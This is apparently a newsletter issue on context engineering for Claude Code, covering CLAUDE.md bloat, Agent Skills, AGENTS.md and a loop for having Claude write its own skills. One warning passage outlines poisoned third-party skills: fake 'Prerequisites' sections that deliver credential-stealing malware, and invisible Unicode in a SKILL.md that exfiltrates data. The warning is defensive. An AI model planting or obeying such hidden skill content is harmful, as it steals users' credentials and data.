## 2026-05-13T12:52:57+04:00

https://substack.com/home/post/p-195771053

> *Welcome to The Digital Creator, helping creators accelerate with AI.*

Last week I watched a builder push his CLAUDE.md to 847 lines.

Framework conventions. Code style. “Always use TypeScript.” “Never use `any`.” Build commands. Test runners. A 200-line section on his database naming conventions.

He was proud of it.

I asked him one question:

*“Have you actually measured if Claude follows any of this?”*

Silence.

Here’s the thing nobody told him…and probably nobody told you:

![](https://substackcdn.com/image/fetch/$s_!fyBG!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe314e17e-ca35-446f-8875-bf0e5c128f75_1408x700.png)

Anthropic’s own Claude Code engineers wrap your entire CLAUDE.md in this hidden directive every single turn:

```markup
<system-reminder>
IMPORTANT: this context may or may not be relevant to your tasks. 
You should not respond to this context unless it is highly relevant 
to your task.
</system-reminder>
```

*Read that again.*

The model is being **explicitly told to discount your CLAUDE.md** unless it seems immediately relevant.

That 847-line masterpiece? It’s burning ~3,000 tokens every turn to be politely ignored.

This is why your agents feel “dumb” when the context fills up.

This is why your rules get violated despite being right there in the file.

This is why the people shipping serious agentic work in 2026 stopped dumping everything into CLAUDE.md a long time ago…and moved to **Skills**.

**In this issue, I’ll show you:**

✅ Why models are token predictors, and what that means for how you steer them

✅ The 3-level progressive disclosure architecture behind Skills (and why it saves you ~95% of your context budget)

✅ When you actually need a CLAUDE.md, when you don’t, and the AGENTS.md standard 60,000+ repos quietly adopted

✅ The recursive skill-building loop the top builders use (the one that treats Claude like a new employee, not a vending machine)

✅ Why downloading random skills off GitHub is the new supply-chain attack vector

✅ The “start with one agent” rule…and the 15× token tax on multi-agent systems

✅ The real moat in 2026: not your prompts, not your skills, but the *iteration log* behind them

This isn’t theory.

This is the exact context engineering stack I’m running across my agents right now… built from the same primitives Anthropic ships in Claude Code, the API, and the Agent SDK.

If you’re already neck-deep in Claude Code or Cursor, this issue is for you.

Let’s get into it.

Before that…

---

#### Newsletter is brought to you by, The Lettuce Solo Summit

[The Lettuce Solo Summit](https://lettuce.co/solo-summit-2026-registration?utm_source=partner&utm_medium=email&utm_campaign=Pat_Flynn_May_26_SS_newsletter) is a free, one-day virtual conference on May 14th where every session is a working masterclass, and every attendee leaves with something they can use that day.  
  
We surveyed 600+ solopreneurs and found a clear pattern: the ones who grow aren’t more talented, they’re more intentional. They’ve each found their version of what works. This Summit helps you find yours. Sessions include a financial framework from a CPA who strategizes for solos, a positioning statement that makes you the obvious choice, an AI critique of your LinkedIn visuals, and a partner strategy to turn your existing network into a real pipeline.  
  
Two tracks. Eleven sessions. All led by experts who know what it takes to make the climb.

![](https://substackcdn.com/image/fetch/$s_!7QLE!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcf983826-ad92-4f2f-9a72-a30e7d8f98d0_800x1000.jpeg)

---

## Models Are Token Predictors. That’s the Whole Game.

Here’s the thing most builders miss when they’re stuffing context into their agents:

**Claude isn’t thinking.**

Neither is GPT-5. Neither is Gemini. Neither is whatever model dropped this week.

They’re token predictors. Sophisticated ones…but token predictors all the same. Every response you’ve ever loved from Claude Opus 4.7 came from the same fundamental operation: “given this sequence of tokens, what comes next?”

*Read that again…*

Because once it lands, everything else in this issue makes sense.

If the model is predicting the next token based on what’s already in its context window…and *only* what’s in its context window…then the quality of your output is downstream of one thing:

**The quality of the tokens you put in.**

Not the quantity. The quality.

This is the part where most builders mess up. They treat the context window like a junk drawer. *“More context = better output, right?”*

Wrong. And Anthropic’s own engineering team published the receipts.

![](https://substackcdn.com/image/fetch/$s_!Vo6I!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde1eeb9c-2cea-42ac-986b-d1026e64b41d_1292x649.png)

Every token you add to the context window depletes the model’s attention budget.

Every token.

Including the 847 lines of CLAUDE.md our friend was so proud of.

### The n² problem nobody warns you about

Here’s the technical reason your agent gets dumber as the context fills up…and why Anthropic’s own docs now use a term they borrowed from Chroma’s research:

**Context rot.**

Transformers…the architecture every frontier LLM is built on…work by letting every token attend to every other token in the context. That’s what makes them powerful. It’s also what makes them brittle.

Because if you have *n* tokens in the context, the model has to compute roughly *n²* pairwise relationships between them.

100 tokens? 10,000 relationships.

10,000 tokens? **100 million relationships.**

100,000 tokens? You see where this is going.

The attention budget gets stretched thin. The model starts missing things. Instructions slip. Rules get violated. The agent that was sharp at the start of the session becomes the agent that “forgot what we were doing” by the end.

This isn’t a Claude problem. This isn’t an OpenAI problem. It’s a transformer problem. Bigger context windows didn’t fix it…they just hid it.

### “Lost in the middle” is real (and it cost a Stanford team 20 points)

A team of researchers from Stanford and Berkeley published a paper called “Lost in the Middle” back in 2023. The finding has held up — Anthropic’s own docs cite this phenomenon today.

**Here’s what they did:**

They gave models 20 documents and asked questions where they knew exactly which document held the answer. Then they shuffled the position of the relevant document.

The result?

When the answer was at **position 1** (start of context), GPT-3.5-Turbo got it right ~75% of the time.

When the answer was at **position 10** (middle), accuracy dropped to ~55%.

That’s a **20-point swing** purely from where the information sat in the window. Same model. Same question. Same documents. Different position.

And here’s the kicker: **Claude-1.3 with its 100K context window showed the exact same U-shaped degradation.**

Bigger context didn’t save them. Bigger context will not save you.

A more recent study from Chroma in July 2025…they call it the “Context Rot” study…tested this on every frontier model including Claude Opus 4 and Sonnet 4.

All of them degraded as context length grew.

![](https://substackcdn.com/image/fetch/$s_!VxfF!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F415f5224-5b1d-4c8d-89bc-58a32c4d061a_1211x768.png)

### The 70% rule (folklore that turned out to be right)

If you hang around in Claude Code communities long enough, you’ll hear a number get thrown around:

**Keep your context window between fresh and 70% full.**

Anthropic has never published this as a hard threshold. But here’s the tell…they’ve quietly retuned Claude Code’s auto-compact trigger from ~95% (in early 2025) to **~64–75%** in late 2025.

That’s not a coincidence.

The product team at Anthropic measured the same degradation curve their researchers wrote papers about…and adjusted the harness accordingly.

So when you hear “the 70% rule,” what you’re really hearing is community wisdom that Anthropic’s own engineers validated through behavior, not press release.

The practical implication for builders:

![](https://substackcdn.com/image/fetch/$s_!Vaot!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe6d40215-d990-4c6c-8c60-b15e1853e5c1_816x334.png)

### The complete context window: what’s actually in there

Now here’s where it matters for your agentic stack.

When you fire up Claude Code or hit the API with the Agent SDK, your context window isn’t just “the conversation.” It’s a layered stack:

1. **System prompt** — Claude Code’s own harness instructions. Already burns ~50 instructions before you’ve typed anything.
2. **CLAUDE.md / AGENTS.md** — your project-level rules, loaded every turn.
3. **Skill metadata** — name + description of every installed skill (~80–100 tokens each, always loaded).
4. **Tool definitions** — every tool the model can call, including MCP server schemas. (Spoiler: these are *expensive*. We’ll get to it.)
5. **The codebase / files Claude has read** — every file viewed sticks around.
6. **The conversation itself** — your messages and Claude’s replies, plus all tool inputs and outputs.

Every single one of these competes for the same finite attention budget.

So when someone tells you “just dump it all in CLAUDE.md, the model will figure it out”

*They’re wrong…*

The model doesn’t have unlimited working memory. It doesn’t have *any* working memory in the human sense. It has an attention mechanism that gets less effective as you flood it.

Your job as a builder isn’t to give Claude *more* context.

> **Your job is to give Claude the right context, at the right time, in the smallest possible footprint.**

That’s context engineering.

I’ve written a step-by-step guide on [building your business context file](https://newsletter.thedigitalcreator.co/p/how-to-build-business-contex-file) …what belongs in it, what to strip out, and how to structure it for maximum signal density. Worth reading alongside this issue.

And it’s the difference between an agent that ships production code and one that needs constant babysitting.

In the next section, I’ll show you exactly why Skills solve this problem in a way CLAUDE.md never could…using a 3-level architecture Anthropic borrowed from interface design.

It’s called progressive disclosure.

And once you understand it, you’ll never want to write another 800-line CLAUDE.md again.

---

## Skills, Progressive Disclosure, and the 95% Token Cut

On October 16, 2025, Anthropic shipped something that quietly changed how serious builders run their agents.

They called it **Agent Skills**.

Simon Willison…one of the most respected voices in the LLM space..read the same announcement and wrote this:

> *“Claude Skills are awesome, maybe a bigger deal than MCP.”*

That post hit 422,000 views in days. Not because Simon was hyping it. Because he’d seen the architecture and understood what it actually does.

**Here’s the thing:**

> Skills aren’t a feature. They’re a **rearchitecting of how context gets loaded into your agent.**

And once you understand the mechanism…they call it *progressive disclosure* …you’ll see why every CLAUDE.md you’ve ever written was solving the wrong problem.

### What a Skill actually is (the simplest possible definition)

Strip away the hype. A Skill is just this:

**A folder. With a markdown file in it. And a few lines of YAML at the top.**

That’s the whole thing.

```markup
my-skill/
├── SKILL.md          ← required
├── scripts/          ← optional executable scripts
├── references/       ← optional docs Claude can read on demand
└── assets/           ← optional templates, images, etc.
```

The `SKILL.md` file looks like this:

markdown

```markup
---
name: brand-voice-writer
description: Use this skill whenever the user asks to write 
  content in Sharyph's voice — newsletters, X posts, threads, 
  or long-form essays. Triggers on phrases like "write me a 
  post," "draft a newsletter," "in my voice."
---

# Brand Voice Writer

[Then the actual instructions Claude follows when this skill triggers]
```

That’s it. No special framework. No new programming language. No SDK.

Just markdown. In a folder. With YAML frontmatter.

Building authority content through AI is a system, not a one-off prompt…if you want to see how this translates into published content, I’ve documented [how to use AI agents for authoritative social posts](https://newsletter.thedigitalcreator.co/p/ai-aigent-to-create-authoritative-social-media-posts) as a concrete example of a skill like this one running in production.

But here’s where the magic happens.

![](https://substackcdn.com/image/fetch/$s_!cyTF!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F239a75b2-5f1e-492f-a510-60397f830ec8_1408x768.png)

### Progressive disclosure: the 3-level architecture

This is the part that broke my brain when I first understood it.

Anthropic’s engineers…Barry Zhang, Keith Lazuka, and Mahesh Murag…published the canonical post on this in October 2025.

**Here’s the architecture, verbatim from their docs:**

![](https://substackcdn.com/image/fetch/$s_!5X-8!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff67c792e-6dd2-45e6-b878-e79c1832eb54_827x265.png)

Read that table again. Slowly.

Here’s what’s happening:

When you start a Claude session with 30 skills installed, the model **doesn’t load all 30 skills into the context window.** That would burn tens of thousands of tokens before you’ve even said hello.

Instead, Claude only sees the **name + description** of every skill. About 100 tokens each. Total cost for 30 skills: ~3,000 tokens.

When you ask Claude to do something…say, “write me a newsletter section in my brand voice”…the model scans the descriptions, identifies that `brand-voice-writer` is relevant, and **only then** pulls the full SKILL.md body into context.

If the skill needs a 50-page reference document? It runs a bash command, reads the file, and only the relevant excerpt enters the context window.

If it needs to execute code? It runs the script via bash. **The script source code never enters the context window.** Only stdout does.

This is why Anthropic could write this exact line in their docs and not be exaggerating:

> *“The amount of context that can be bundled into a skill is effectively unbounded.”*

You can build a skill backed by 500 pages of reference material. The model only loads what it needs, when it needs it.

### The token math (this is where it gets ugly for CLAUDE.md)

Let’s run actual numbers.

Take a typical 5–10 KB CLAUDE.md…say, the 847-line monster from our friend in Section 1.

That file costs roughly **1,500–3,000 tokens loaded every single turn.**

Every. Turn.

You send a message? Loaded. Claude responds? Still loaded. You ask a follow-up? Loaded again. 50-message conversation? **You’ve paid for that CLAUDE.md 50 times.**

Now compare that to Skills.

An independent analysis of Anthropic’s first 17 official skills measured **a median of ~80 tokens per skill metadata block**. The smallest (webapp-testing) was 55 tokens. The largest (xlsx) was 235.

Here’s what that means in practice:

**For the same upfront token cost as one bloated CLAUDE.md, you can install 15–30 Skills…and only the relevant ones load their body.**

Let me say that again because it’s the entire point of this section:

**You’re not choosing between “comprehensive CLAUDE.md” and “minimal CLAUDE.md.”**

**You’re choosing between “everything loaded all the time” and “only what’s needed, when it’s needed.”**

That’s not a small optimization. That’s a fundamentally different architecture.

![](https://substackcdn.com/image/fetch/$s_!DMwT!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6ce5284d-dc32-4b20-8faf-081e9fb76ddb_1408x768.png)

### Where Skills actually run

Skills work across the entire Claude ecosystem now. As of April 2026, you can deploy them in:

✅ **Claude.ai** (Pro, Max, Team, Enterprise) — upload as a zip via Settings → Features

✅ **Claude Code** — drop folders into `.claude/skills/` (project-level) or `~/.claude/skills/` (user-level, available across all projects)

✅ **The Anthropic API** — with three beta headers enabled

✅ **The Agent SDK** — for production agentic systems

✅ **Custom MCP servers** — Anthropic published Skills as an open standard at agentskills.io in December 2025

One important note: **custom skills don’t sync across surfaces.** A skill you upload to Claude.ai isn’t automatically available in Claude Code. You version-control them in your dotfiles or a private GitHub repo and deploy where needed.

### Skills compose. This is the underrated superpower.

Here’s something the launch posts buried that should be the headline:

**Skills stack.**

Quote from Anthropic’s announcement:

> *“Claude automatically identifies which skills are needed and coordinates their use.”*

**Translation:** in a single chat, Claude can pull in `pdf-skill` + `brand-voice-writer` + `slack-formatter` + `image-compressor` simultaneously when the task requires all four. You don’t orchestrate this. You don’t write a “manager prompt.” Claude reads the descriptions and assembles the right combination on the fly.

This is what separates Skills from every previous “load these prompts” approach.

It’s not a static configuration. It’s a dynamic assembly line.

### Why I tell creators to stop downloading random skills off GitHub

Now…a hard warning before you go skill-shopping.

There are GitHub repos right now claiming “1,400+ installable skills.” Marketplaces like ClawHub, agentskills.so, and a dozen others. Awesome-claude-skills lists are exploding.

**Most of these are useless to you. And some of them are actively dangerous.**

**Useless because:** someone else’s skill encodes someone else’s workflow. Their definition of “well-written code” isn’t yours. Their newsletter format isn’t yours. Their database conventions aren’t yours. You’ll spend more time fighting their assumptions than the skill saves you.

**Dangerous because:** in January 2026, security researchers at Snyk and koi.ai disclosed **ClawHavoc** …a campaign that compromised **341 skills out of 2,857** on the ClawHub registry. That’s roughly 12% of an entire registry. Skills with names like `solana-wallet-tracker` and `youtube-summarize-pro` were quietly delivering credential-stealing malware via fake “Prerequisites” sections.

Three months later, Johann Rehberger published a proof-of-concept showing **invisible Unicode characters** embedded inside a SKILL.md that survived human code review and silently exfiltrated data.

I’ll cover the security angle in detail later in this issue.

For now, the rule is simple:

> **Build your own skills. Encode your own workflows. Trust nothing you didn’t write or that didn’t come directly from Anthropic.**

Because the entire reason Skills are valuable is that they encode **your specific way of working** …your taste, your judgment, your edge cases. A generic skill from a stranger’s GitHub doesn’t do that.

It just gives you someone else’s mediocre middle.

In the next section, I’ll show you exactly *how* to build skills the right way…using a recursive feedback loop the top builders are running. The wrong way is to write the skill first. The right way is to let Claude fail at the workflow first, then **let the model write the skill itself.**

This is where context engineering stops being theory and starts being a competitive moat.

---

## When You Actually Need a CLAUDE.md (And When You’re Just Wasting Tokens)

Let me make a claim that’s going to upset some of you:

**95% of builders writing CLAUDE.md files don’t need them.**

Not “should make them shorter.” Don’t need them at all.

Before you close the tab — hear me out. Because the data backs this up, and Anthropic’s own documentation quietly admits it.

### The thing models already know

Modern frontier models — Claude Opus 4.7, GPT-5, Gemini 3 — were trained on roughly the entire indexed internet. They know React. They know Next.js. They know Tailwind. They know how to use Prisma, how to write Python tests, how to set up a FastAPI endpoint, how to deploy to Vercel.

You don’t need to tell them.

And yet, the most common CLAUDE.md I see looks like this:

markdown

```markup
## Tech Stack
We use Next.js 15 with the App Router.
We use TypeScript with strict mode.
We use Tailwind CSS for styling.
We use Prisma as our ORM.
We use shadcn/ui for components.
...
```

Every word of that is a token spent on something the model already knows.

You’re not steering Claude. You’re describing your stack to a model that’s already deployed half the production Next.js apps on the internet. Worse — you’re paying ~3,000 tokens per turn to do it, and burning through that finite attention budget we covered in Section 2.

### What Anthropic actually recommends putting in CLAUDE.md

Pull up the official Claude Code best practices doc (`code.claude.com/docs/en/best-practices`) and read it carefully. Here’s what they say belongs in a CLAUDE.md:

**✅ Include:**

- Bash commands Claude can’t guess (your specific build runner, your specific test command)
- Code style rules that **differ from defaults**
- Repo etiquette (branch naming, PR conventions, commit message format)
- Architectural decisions specific to *your* project
- Dev environment quirks (required env vars, weird local setup steps)
- Non-obvious gotchas

**❌ Exclude:**

- Anything Claude can figure out by reading the code
- Standard language conventions (”use TypeScript,” “prefer const over let”)
- Detailed API docs (link to them, don’t paste)
- Information that changes frequently
- “Write clean code”–style platitudes
- File-by-file codebase summaries

Now go look at your CLAUDE.md.

How much of it is actually in the left column?

For most builders I audit, the answer is **less than 30%**. The other 70% is ceremonial — feel-good documentation that makes you look thorough and burns context on every turn.

![](https://substackcdn.com/image/fetch/$s_!KFPq!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2de9dc60-045a-4c95-9583-f8a478e41341_1408x679.png)

### The hidden directive that changes everything

Here’s the part that broke me when I learned it.

Earlier this year, the team at HumanLayer reverse-engineered Claude Code’s harness using a proxy on `ANTHROPIC_BASE_URL`. They wanted to see exactly how CLAUDE.md gets injected into the model.

What they found:

Your entire CLAUDE.md is wrapped in this exact directive every time it’s loaded:

```markup
<system-reminder>
IMPORTANT: this context may or may not be relevant to your tasks. 
You should not respond to this context unless it is highly relevant 
to your task.
</system-reminder>
```

Read that one more time.

The model is **explicitly instructed to discount your CLAUDE.md** unless it seems immediately relevant to what you’re doing.

This isn’t a bug. This is intentional. Anthropic’s engineers know that bloated CLAUDE.md files hurt performance — so they wrap them in a “you can probably ignore this” disclaimer.

Which means:

> **Every word you add to CLAUDE.md is a word that the model has been told to discount.**

The longer your file, the more aggressively it gets discounted. The less likely your *actual important rules* are to fire.

This is why people complain that Claude “ignored my CLAUDE.md.” It’s not ignoring it. It’s doing what it was told — discounting context that doesn’t seem relevant. And in a 847-line file, almost nothing seems relevant on any given turn.

Anthropic itself confirms this in their own docs:

> *“Bloated CLAUDE.md files cause Claude to ignore your actual instructions!... If Claude keeps doing something you don’t want despite having a rule against it, the file is probably too long and the rule is getting lost.”*

That’s a direct quote from Anthropic. Their own engineers warning you.

### The 150-instruction ceiling

Here’s another data point most builders never see.

The team at HumanLayer ran experiments measuring how many discrete instructions a frontier reasoning model can follow with consistency.

The number: **~150–200 instructions** before reliability collapses.

But Claude Code’s system prompt — the one Anthropic ships before you write a single word — already burns roughly **50 of those instructions**.

That leaves you with 100–150 instructions of headroom. Total. Across:

- Your CLAUDE.md
- Your AGENTS.md (if any)
- Every skill description loaded into the system prompt
- Every tool definition
- The conversation itself

If your CLAUDE.md alone has 200 lines of “rules,” you’ve already exceeded the budget. The model isn’t following all of them. It can’t. It’s physically stretched past capacity.

This is why HumanLayer’s own root CLAUDE.md is **under 60 lines**.

Not because they’re lazy. Because they measured.

### AGENTS.md: the open standard 60,000+ repos quietly adopted

Here’s something else that happened in 2025 that didn’t get the attention it deserved:

The major AI coding tool vendors — OpenAI, Google (Jules), Sourcegraph (Amp), Cursor, and Factory — got together and agreed on a single shared spec for agent instruction files.

They called it **AGENTS.md**.

The site is `agents.md`. Open standard. Markdown-based. No required schema.

By April 2026, GitHub queries return **over 60,000 open-source projects** with an `AGENTS.md` file. OpenAI’s main repo alone has 88 nested AGENTS.md files. The spec was donated to the Linux Foundation’s Agentic AI Foundation alongside Anthropic’s MCP and Block’s Goose.

Native AGENTS.md adopters now include:

Codex, Jules, Aider, Goose, Zed, Warp, VS Code, Devin, Junie, Amp, Cursor, RooCode, Gemini CLI, Windsurf, Augment, GitHub Copilot Coding Agent.

**Claude Code is not a native adopter.** But here’s the trick Simon Willison surfaced from Anthropic’s own guidance:

> Make your CLAUDE.md a single line:
> 
> ```markup
> @AGENTS.md
> ```
> 
> And Claude Code will load AGENTS.md as if it were the project file.

This is the cleanest pattern for multi-tool teams. One source of truth. Every agent reads it. No drift.

![](https://substackcdn.com/image/fetch/$s_!zZh1!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F08c37fde-d592-446a-b1b5-5e2cdd19c9b2_1408x768.png)

### The decision rubric (the only one you need)

After all of this, here’s the decision tree I run for every project I build:

![](https://substackcdn.com/image/fetch/$s_!P0J8!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F30dc93a3-3e49-437e-8407-80c70e6c1401_1480x678.png)

Notice what’s *not* in there: “general code style rules,” “framework conventions,” “preferred libraries,” “tech stack documentation.”

The model already knows that stuff. Stop paying tokens to repeat it.

### The 56% problem nobody talks about

Now…fair warning, because I want you walking out of this section with the full picture.

Skills aren’t a silver bullet.

> Vercel ran a public eval on agent skill triggering and found that **skills failed to invoke when expected in 56% of test cases.**

*Read that again...*

More than half the time, the model didn’t realize it should pull the relevant skill body into context. The metadata description didn’t trigger. The skill sat there, unused, while the model winged it from general knowledge.

This is why Anthropic’s own `skill-creator` meta-skill explicitly warns:

> *“Currently Claude has a tendency to ‘undertrigger’ skills. To combat this, please make the skill descriptions a little bit ‘pushy.’”*

And it gives this exact transformation as an example:

❌ *“How to build a simple fast dashboard...”*

✅ *“How to build a simple fast dashboard... Make sure to use this skill whenever the user mentions dashboards, data visualization, internal metrics, or wants to display any kind of company data, even if they don’t explicitly ask for a dashboard.”*

The pushy version triggers more reliably. It tells the model exactly when to fire.

This is why the pragmatic stack in 2026 isn’t *“all Skills, no CLAUDE.md.”* It’s:

- A **tight AGENTS.md** for the deterministic stuff that must always be loaded
- **Skills** for the procedural knowledge that *should* trigger on demand
- **Hooks** for the things you can’t afford to leave to probability

Skills + a 60-line CLAUDE.md beats Skills alone. Every time.

### What this means for you, today

If you’re running Claude Code or Cursor right now, here’s your homework before the next section:

1. **Open your CLAUDE.md.** Count the lines.
2. **Strike out anything the model already knows** (framework conventions, language defaults, generic code style).
3. **Strike out anything that’s just “be smart, write good code” platitudes.**
4. **What’s left?** That’s your real CLAUDE.md.
5. **If it’s under 60 lines**, you’re in elite company.
6. **If it’s still 200+ lines**, you have a Skills problem disguised as a CLAUDE.md problem — and we’re about to fix that.

Because in the next section, I’m going to show you exactly how to take all that “specific workflow” knowledge…the stuff that *would* belong in CLAUDE.md if you only used it sometimes…and turn it into Skills the right way.

Not by writing them.

By letting Claude write them for you.

This is where most builders mess up. And it’s the technique that separates the people shipping production agents from the people still babysitting Claude through every task.

---

## How to Actually Build a Skill (Stop Writing Them. Let Claude Build Them For You.)

Here’s the part where most builders mess up.

They identify a workflow.  
They get excited.  
They open a fresh `SKILL.md`, start typing instructions, fill in the YAML frontmatter, save the file, and… deploy it.

Then they’re shocked when the skill fails on the first real task.

I’ve been there.

I did this myself for the first two months I was building skills. Wrote them like documentation. Like I was writing a wiki page for a junior employee.

It doesn’t work.

Here’s why:

> **You don’t actually know your own workflow until you’ve watched a model fail at it.**

The steps you *think* you take are not the steps you *actually* take. The decisions you think are obvious are obvious to *you* …because you’ve made them 10,000 times. To Claude, they’re invisible.

The skill you wrote from memory is missing every gotcha, every edge case, every “obviously you’d…” assumption that lives in your head and not in your documentation.

This is why the wrong way to build a skill is to write it.

The right way is to **let Claude fail at the workflow first, document the failures, and then have the model write the skill itself.**

I’ll walk you through the exact loop.

### Step 1: Run the workflow manually, with Claude, no skill

Pick a workflow you do regularly. Something you’ve done 10+ times. Something you have *taste* on.

For me, my best skill was the one [I built for writing X Articles in my voice.](https://newsletter.thedigitalcreator.co/p/newsletter-content-system-claude-skills) I write a lot of them. I know what works. I have strong opinions about hooks, structure, the rhythm of short sentences, the way I close out a piece.

So I started a fresh Claude Code session and just… did the work.

```markup
sharyph: I want to write an X article about the AI Digital Product 
Builder. Help me draft it. Here's the topic, here's my offer, here's 
the rough idea I want to land.
```

Then I let Claude take a swing.

The first draft was mediocre. Generic. Sounded like every other AI-written X post on the internet.

I corrected it. Specifically:

- “The hook is too soft. Lead with the contrarian claim.”
- “These sentences are too long. Break them up.”
- “Don’t bullet-point this section. I write in prose here.”
- “The CTA at the end is wrong. I do P.S. with bonus tips, not ‘click here to learn more.’”

Claude rewrote it. Better. Still not right.

I corrected again:

- “You’re using em-dashes wrong. I use them for asides, not for replacing periods.”
- “The opening question needs to land harder. Try a single-line one-word punch.”
- “Don’t summarize at the end. End on a forward-looking line.”

By the fifth iteration, the draft was actually publishable.

**That’s when the magic happens.**

![](https://substackcdn.com/image/fetch/$s_!zAPh!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F18068beb-5971-4a64-8fdb-d0a9beee4488_1408x768.png)

### Step 2: Ask Claude to write the skill itself

This is where it clicks for builders.

Once I had a publishable draft, I dropped this into the session:

```markup
Now I want you to review everything we just did. Look at 
every correction I gave you, every revision you made, every 
preference I expressed. Then write a SKILL.md file that captures 
the workflow we just executed. Make it pushy in the description so 
it triggers reliably. Save it as ~/.claude/skills/x-article-writer/SKILL.md.
```

Claude wrote it.

Not me. **Claude.**

And the skill it produced was *better* than what I would have written from memory…because Claude had actually just lived through the workflow. It had the failures fresh in context. The corrections were right there. It knew exactly where I’d interrupted and why.

The first version of `x-article-writer` skill it generated was about 80 lines long. Specific. Concrete. Full of phrases like:

- “If the user is writing an X Article, lead with a contrarian or counterintuitive single-line hook. Avoid ‘X is broken’ framings.”
- “Sharyph uses em-dashes only for parenthetical asides, never to replace periods or commas.”
- “End every X Article on a forward-looking line, not a summary. Avoid ‘in conclusion’ or ‘to wrap up.’”

These weren’t rules I’d given Claude. They were **rules Claude inferred from watching me correct it five times.**

That’s the loop. It’s the same recursive process I used when I [built 3 AI agents that write my newsletters](https://newsletter.thedigitalcreator.co/p/how-i-built-3-ai-agents-that-write-my-newsletters) …the skill is always better when Claude inferred the rules from watching you, not from your documentation.

### Step 3: Run the skill on a fresh task. Watch it fail.

Now here’s where most builders get cocky.

They write the skill, run it once, see it work on a similar task, and ship it. Then a week later they’re confused why it produces garbage on a slightly different topic.

The skill isn’t done after Step 2. **It’s at version 1.**

So I deliberately tested it on a different topic — an X Article about Substack monetization, completely different content from the original session. I started a fresh session, fired up the skill, and watched what happened.

It failed. In specific, predictable ways.

The hook was fine. The structure was fine. But Claude over-applied one of my preferences — it broke up sentences too aggressively, even in places where I’d want a longer flowing line. The skill had codified “short sentences” as a hard rule when it should have been “short sentences for emphasis, longer for narrative.”

So I corrected it again, on this new task.

### Step 4: Feed the failure back. Update the skill.

This is the recursive part.

Once the new task was working, I dropped this in:

```markup
Look at what just happened. The skill made a specific 
mistake — it broke up sentences too aggressively in narrative 
sections. Now update the SKILL.md file at 
~/.claude/skills/x-article-writer/SKILL.md to prevent this mistake 
in the future. Add a clarifying rule about when to use short 
sentences vs longer ones.
```

Claude opened the file, made the edit, saved it.

The skill was now version 2.

The next task it ran on, the mistake didn’t happen.

### The numbers nobody warns you about

Here’s the part to internalize before you start building:

**Expect 2–6 hiccups before a skill executes flawlessly.**

That’s not a bug. That’s the loop.

Anthropic’s own `skill-creator` meta-skill…the one that ships in their official repo…defaults to `--max-iterations 5` when optimizing skill descriptions. They expect five iterations as the baseline before performance is reliable.

A practitioner named Erik Mager, who turned this into a measured engineering practice, frames it like this:

> *“Before: you guessed at descriptions and hoped Claude picked up on them. After: you write test cases, run the loop, measure precision and recall, ship when the numbers are green. That’s not prompting. That’s engineering.”*

Read that one more time.

**That’s not prompting. That’s engineering.**

This is the shift that separates builders shipping serious agents from builders posting “look what I built with one prompt!” on Twitter. The serious work is in the iteration loop. The skill file is just the artifact.

![](https://substackcdn.com/image/fetch/$s_!KQkD!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd8f1e29c-01c6-4f0f-8d49-8c6f3289bf98_1408x685.png)

### A complete worked example: my newsletter-writer skill

Let me show you what this looks like end-to-end with a skill I actually run.

I have a skill at `~/.claude/skills/newsletter-writer-tdc/SKILL.md`. It’s the one Claude is using right now to help me write *this* newsletter. I documented the complete system…including the exact SKILL.md structure and the workflow behind it…in [Newsletter Content System with Claude Skills](https://newsletter.thedigitalcreator.co/p/newsletter-content-system-claude-skills).

The first version was short. It captured the basics: my voice, my structure, my CTA pattern.

I tested it on three newsletter drafts. It worked on the first. Failed in subtle ways on the second (tone too casual). Failed in different ways on the third (hooks too long).

After each failure, I fed it back:

```markup
This newsletter draft has the wrong tone for an audience 
of builders. It reads as if for beginners. Update the skill at 
~/.claude/skills/newsletter-writer-tdc/SKILL.md to add an audience-
detection rule: if the topic is technical (Claude Code, MCP, agents, 
API), lean direct and dense. If it's strategic (content systems, 
monetization), lean conversational.
```

Claude updated the file.

```markup
sharyph: The hooks in this draft are too long — 4–5 sentences 
before the first line break. My hooks are usually 1–2 sentences max. 
Update the skill to enforce short hooks under 25 words.
```

Claude updated again.

By version 7, the skill was producing first drafts I could publish with light edits. By version 12, the drafts were better than what I would have written cold…because the skill had captured rules I follow unconsciously and made them explicit.

That skill is now part of my personal stack. It’s encoded my taste. It’s a written-down memory of every mistake Claude has made writing in my voice — so it doesn’t have to rediscover them every time.

### The principle behind the loop

Here’s the framing that makes all of this click:

**Treat Claude like a new employee. Not a vending machine.**

A vending machine: insert prompt, receive output, complain about the output.

A new employee: walk them through the workflow, correct them when they make mistakes, document the corrections, expect the second week to be better than the first, expect the third month to be transformative.

